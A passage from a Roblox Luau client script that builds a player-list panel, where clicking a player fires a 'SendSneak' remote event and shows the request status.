		displayName.TextTruncate = Enum.TextTruncate.AtEnd
		displayName.ZIndex = row.ZIndex + 1
		displayName.Parent = row

		local username = Instance.new("TextLabel")
		username.Size = UDim2.new(1, -64, 0, 16)
		username.Position = UDim2.fromOffset(56, 28)
		username.BackgroundTransparency = 1
		username.Text = "@" .. other.Name
		username.TextColor3 = C_DIM
		username.TextSize = 10
		username.Font = Enum.Font.GothamMedium
		username.TextXAlignment = Enum.TextXAlignment.Left
		username.TextTruncate = Enum.TextTruncate.AtEnd
		username.ZIndex = row.ZIndex + 1
		username.Parent = row
		
		row.MouseEnter:Connect(function() TweenService:Create(row,TW_ROW,{BackgroundColor3=C_HOVER}):Play() end)
		row.MouseLeave:Connect(function()
			TweenService:Create(row,TW_ROW,{
				BackgroundColor3 = C_INPUT
			}):Play()
		end)
		row.MouseButton1Click:Connect(function()
			if not SendSneak then
				statusLbl.Text = "Remote not found"
				statusLbl.TextColor3 = C_OFF
				return
			end

			statusLbl.Text = "Sending request..."
			statusLbl.TextColor3 = C_ON

			local ok, err = pcall(function()
				SendSneak:FireServer(other)
			end)

			if ok then
				statusLbl.Text = "Request sent: " .. other.DisplayName
			else
				statusLbl.Text = tostring(err):sub(1, 40)
				statusLbl.TextColor3 = C_OFF
			end
		end)
		pRows2[other]=row
	end
	local function removeSRow(other) if pRows2[other] then pRows2[other]:Destroy(); pRows2[other]=nil end end
	for _,other in ipairs(Players:GetPlayers()) do if other~=player then buildSRow(other) end end
	Players.PlayerAdded:Connect(function(other) if other~=player then buildSRow(other) end end)
	Players.PlayerRemoving:Connect(function(other) removeSRow(other) end)
end

buildSneakPanel()
buildMobileUI()
